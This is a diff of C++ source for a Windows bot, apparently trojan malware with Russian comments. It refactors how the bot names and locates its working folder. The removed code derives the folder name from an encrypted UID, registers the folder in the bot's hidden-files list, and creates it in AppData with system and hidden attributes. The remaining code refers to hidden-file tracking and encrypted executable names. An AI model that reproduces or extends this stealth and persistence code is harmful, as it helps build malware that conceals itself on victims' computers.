@@ -76,13 +76,6 @@ DWORD BOT_HIDDEN_FILES[MAX_HIDDEN_FILES + 1] = {0};
 
 
 //---------------------------------------------------------------------------
-#define MAX_BOT_WORK_FOLDER_LEN 15
-
-// Рабочий каталог бота
-char BOT_WORK_FOLDER_NAME[MAX_BOT_WORK_FOLDER_LEN + 1] = {0};
-
-DWORD BotWorkPathHash = 0;
-
 
 // Максимальный размер массива шифрованного файла
 #define MAX_CRYPTED_EXE_NAME_SIZE 50
@@ -105,65 +98,10 @@ char BOT_UID[128];
 //Внутренние методы пространства имён BOT
 namespace BOT
 {
-	PCHAR  MakeWorkFolder(); // Функция возвращает имя рабочего каталога бота
 	string MakeWorkPath();   // Функция генерирует полный рабочий путь
 	string MakePath(const char* SubDirectory); // Функция генерирует имя пути в рабочем каталоге
 }
 
-
-//-------------------------------------------
-// MakeWorkFolder - Функция генерирует имя
-//                  рабочего каталога бота
-//                  (короткое имя)
-//-------------------------------------------
-PCHAR BOT::MakeWorkFolder()
-{
-	if (!STRA::IsEmpty(BOT_WORK_FOLDER_NAME))
-		return BOT_WORK_FOLDER_NAME;
-
-	// Генерируем имя на основе константы обработанной ключём из уида
-	string WorkPath = GetStr(StrBotWorkPath);
-
-	PCHAR Name = UIDCrypt::CryptFileName((PCHAR)WorkPath.t_str(), false);
-
-	// Копируем путь в глобальный массив
-	const char *Buf = (Name) ? Name : WorkPath.t_str();
-
-	DWORD ToCopy = Min(MAX_BOT_WORK_FOLDER_LEN, STRA::Length(Buf));
-
-	m_memcpy(BOT_WORK_FOLDER_NAME, Buf, ToCopy);
-	BOT_WORK_FOLDER_NAME[ToCopy] = 0;
-
-	STR::Free(Name);
-
-	// Расчитываем хэш
-	BotWorkPathHash = STRA::Hash(BOT_WORK_FOLDER_NAME);
-	// Добавляем папку в список скрытых файлов
-	BOT::AddHiddenFile(BotWorkPathHash);
-
-	return BOT_WORK_FOLDER_NAME;
-}
-
-
-//-------------------------------------------
-// MakeWorkPath - Функция генерирует полный
-//                путь к рабочему каталогу
-//                бота
-//-------------------------------------------
-string BOT::MakeWorkPath()
-{
-	// Функция генерирует рабочий путь
-	string Result = GetBotPath();
-	Result += MakeWorkFolder();
-	Result += "\\";
-
-	if (!DirExists(Result.t_str()))
-	{
-		pCreateDirectoryA(Result.t_str(), NULL);
-		pSetFileAttributesA(Result.t_str(), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
-    }
-	return Result;
-}
 
 
 //-------------------------------------------
@@ -653,21 +591,7 @@ void BOT::InitializeApi()
 string BOT::GetBotPath()
 {
 	if (BotData->BotPath.IsEmpty())
-	{
-		int CSIDL =  CSIDL_COMMON_APPDATA;
-		// Временный патч. В Висте и старше получаем папку текущего юзера
-		#ifdef USE_CURRENT_USER
-			OSVERSIONINFOEXA OSVersion;
-			OSVersion.dwOSVersionInfoSize = sizeof( OSVERSIONINFOEXA );
-			if (pGetVersionExA( (OSVERSIONINFOA*)&OSVersion ) )
-			{
-				if ( OSVersion.dwMajorVersion >= 6)
-					CSIDL =  CSIDL_APPDATA;
-			}
-        #endif
-		// Создаём путь
-		BotData->BotPath =  GetSpecialFolderPathA(CSIDL, NULL);
-	}
+    	BotData->BotPath = MakeBotPath();
 	return BotData->BotPath;
 }
 //----------------------------------------------------------------------------
@@ -686,13 +610,6 @@ PCHAR BOT::GetWorkPath(PCHAR SubDir, PCHAR FileName)
 //	//   создаётся в корне системного диска
 //    return BOTDoGetWorkPath(true, SubDir, FileName);
 //}
-//----------------------------------------------------------------------------
-
-DWORD BOT::GetWorkFolderHash()
-{
-	//  Функция возвращает хэш имени рабочей папки
-	return BotWorkPathHash;
-}
 //----------------------------------------------------------------------------
 
 PCHAR BOT::GetBotExeName()
